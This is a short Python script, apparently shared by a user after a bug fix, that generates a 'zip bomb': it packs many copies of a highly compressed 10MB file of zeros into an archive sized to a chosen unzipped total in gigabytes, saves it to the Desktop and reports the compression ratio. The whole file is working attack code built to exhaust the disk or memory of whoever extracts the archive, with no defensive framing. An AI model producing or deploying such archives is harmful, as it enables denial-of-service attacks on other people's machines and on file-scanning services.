#fixed the next error of no selectable size mb



import zipfile
import os
from pathlib import Path

def create_custom_nested_bomb():
    try:
        target_gb = float(input("Enter desired unzipped size in GB: "))
    except ValueError:
        print("Invalid input.")
        return

    desktop_path = Path.home() / "Desktop"
    temp_zip = desktop_path / "base_layer.zip"
    final_zip = desktop_path / "zip_bomb.zip"

    # We use a 10MB base file. 
    # To get 1GB, we need 100 copies.
    # To get 'target_gb', we need target_gb * 100 copies.
    base_size_mb = 10
    num_copies = int(target_gb * (1024 / base_size_mb))

    print(f"\nCompiling {target_gb}GB bomb...")

    # Step 1: Create the 10MB base layer
    with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as z0:
        z0.writestr('data.txt', b'0' * (base_size_mb * 1024 * 1024))

    # Step 2: Nest the copies into the final file
    try:
        with zipfile.ZipFile(final_zip, 'w', zipfile.ZIP_DEFLATED, allowZip64=True) as z1:
            for i in range(num_copies):
                # We name each internal file differently so they all count
                z1.write(temp_zip, f"part_{i}.zip")
                
                # Simple progress preview
                if i % 100 == 0 and i > 0:
                    print(f"Adding layer... {int((i/num_copies)*100)}% complete")

        # Cleanup
        os.remove(temp_zip)

        # Step 3: Stats Preview
        physical_bytes = os.path.getsize(final_zip)
        physical_mb = physical_bytes / (1024 * 1024)
        
        # Calculate ratio: (Target GB * 1024) / Physical MB
        ratio = (target_gb * 1024) / physical_mb if physical_mb > 0 else 0

        print("\n" + "="*30)
        print(f"COMPILATION COMPLETE")
        print(f"Target Size:    {target_gb} GB")
        print(f"Actual Size:    {physical_mb:.2f} MB")
        print(f"Ratio:          {int(ratio)}:1")
        print(f"Location:       {final_zip}")
        print("="*30)
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    create_custom_nested_bomb()
